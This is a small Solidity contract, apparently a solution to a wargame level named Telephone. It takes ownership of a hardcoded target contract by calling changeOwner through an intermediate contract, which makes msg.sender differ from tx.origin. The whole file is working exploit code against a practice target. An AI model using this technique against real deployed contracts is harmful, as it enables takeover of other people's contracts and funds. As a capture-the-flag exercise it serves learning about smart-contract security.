// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract TelephoneSolution {
    // Address of Telephone instance
    address constant instance = 0x5d1C19818e7c9d0bC2de9Af7c31848f448E5B7E9;

    function solve() public {
        // Calling from this contract adds a hop, making it so that for the
        // instance, msg.sender is this, and tx.origin is the original sender
        (bool success,) = instance.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );

        require(success, "call to Telephone failed");
    }
}